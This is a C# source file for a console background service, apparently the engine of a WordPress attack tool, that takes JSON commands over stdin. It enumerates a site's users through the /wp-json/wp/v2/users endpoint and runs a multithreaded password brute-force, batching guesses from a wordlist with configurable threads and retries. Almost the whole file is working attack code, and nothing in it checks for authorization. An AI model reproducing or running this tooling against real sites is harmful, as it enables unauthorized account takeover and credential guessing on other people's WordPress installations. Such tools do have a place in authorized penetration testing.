using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace react_background_service
{
    class Program
    {
        private static readonly List<Task> ProcessList = new List<Task>();
        
        private static void SendStatus()
        {
            Console.WriteLine(JsonConvert.SerializeObject(ProcessList));
        }

        private static void ReportTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SendStatus();
        }
        
        static System.Threading.Tasks.Task Main()
        {
            var reportTimer = new System.Timers.Timer {Interval = 10000};
            reportTimer.Elapsed += ReportTimerElapsed;
            reportTimer.Start();
            
            while (true)
            {
                var command = Console.ReadLine();

                if (command != null)
                {
                    var action = JsonConvert.DeserializeObject<Task>(command);

                    if (action.MessageAction == Action.Add)
                    {
                        var id = 1;
                        if (ProcessList.Count > 0)
                        {
                            id = ProcessList.Max(x => x.Id) + 1;
                        }

                        ProcessList.Add(new Task()
                        {
                            Id = id,
                            Name = action.Name,
                            Percentage = 0,
                            Url = action.Url,
                            TaskStatus = Status.Starting,
                            TaskType = action.TaskType,
                            MessageAction = Action.Ping,
                            Username = action.Username,
                            Wordlist = action.Wordlist,
                            TaskResult = new Result()
                            {
                                UserEnumeration = new List<UserObj>(), 
                                BruteForce = new LoginCredentials()
                            },
                            Options = new Options()
                            {
                                BruteForceOptions = new BruteForceOptions()
                                {
                                    BatchCount = action.Options.BruteForceOptions.BatchCount,
                                    MaxThreads = action.Options.BruteForceOptions.MaxThreads,
                                    RetryCount = action.Options.BruteForceOptions.RetryCount,
                                }
                            }
                        });

                        SendStatus();

                        // USER ENUMERATION
                        if (action.TaskType == Type.Enumeration)
                        {
                            var enumTask = new System.Threading.Tasks.Task(async () =>
                            {
                                // ToDo: [enumTask Task Cancellation]
                                var index = ProcessList.FindIndex(a => a.Id == id);
                                var process = ProcessList[index];

                                ProcessList[index].TaskStatus = Status.Running;

                                var client = new HttpClient();
                                var response = await client.GetAsync(process.Url + "/wp-json/wp/v2/users");
                                response.EnsureSuccessStatusCode();
                                var responseBody = await response.Content.ReadAsStringAsync();
                                var list = JsonConvert.DeserializeObject<List<UserObj>>(responseBody);

                                // save result
                                ProcessList[index].TaskResult.UserEnumeration = list;

                                // update task status
                                ProcessList[index].TaskStatus = Status.Ready;
                                ProcessList[index].Percentage = 100;

                                //SendStatus();
                            });
                            enumTask.Start();
                        }

                        // BRUTE FORCE ATTACK
                        if (action.TaskType == Type.BruteForce)
                        {
                            var bruteTask = new System.Threading.Tasks.Task(() =>
                            {
                                // ToDo: [bruteTask Task Cancellation]

                                var index = ProcessList.FindIndex(a => a.Id == id);
                                var process = ProcessList[index];

                                ProcessList[index].TaskStatus = Status.Running;

                                var uri = process.Url;
                                var username = process.Username;
                                var wordListPath = process.Wordlist;
                                var maxThreads = process.Options.BruteForceOptions.MaxThreads;
                                var batchCount = process.Options.BruteForceOptions.BatchCount;
                                var retryCount = process.Options.BruteForceOptions.RetryCount;
                                var found = false;
                                var watch = Stopwatch.StartNew();

                                var la = new LoginAttempt(new Uri(uri));
                                using var sr = new StreamReader(wordListPath);

                                void Update(decimal percentage, long seconds)
                                {
                                    var remaining = TimeSpan.FromSeconds(seconds);
                                    var progress = $"{percentage * 100:0.0000}";

                                    process.Percentage = Convert.ToDouble(percentage * 100);
                                }

                                while (!sr.EndOfStream)
                                {
                                    var buffer = new List<string>();
                                    for (var i = 0; i < batchCount; i++)
                                    {
                                        buffer.Add(sr.ReadLine());
                                    }

                                    var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
                                    var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
                                    var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
                                    Update(percentage, remainingSeconds);

                                    Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, password =>
                                    {
                                        var currentRetry = 0;
                                        for (; ; ) // retry pattern
                                        {
                                            try
                                            {
                                                if (!la.LoginAttemptAsync(username, password).GetAwaiter().GetResult()) return;
                                                // password found!
                                                found = true;
                                                break;
                                            }
                                            // ToDo: [Brute Force Exception handler] Keep trying if the exception may be temporary. Stop trying if not.
                                            catch
                                            {
                                                currentRetry++;

                                                if (currentRetry > retryCount) break; // not work, stop trying
                                                Thread.Sleep(1000 * currentRetry);
                                            }
                                        }
                                    });

                                    if (found) return;
                                }

                                if (found) return;

                                // Password not found!

                            });
                            bruteTask.Start();
                        }
                    }

                    if (action.MessageAction == Action.Remove)
                    {
                        var item = ProcessList.SingleOrDefault(x => x.Id == action.Id);
                        if (item != null) ProcessList.Remove(item);
                    }

                    if (action.MessageAction == Action.Ping)
                    {
                        //SendStatus();
                    }
                }
            }
        }
    }
}
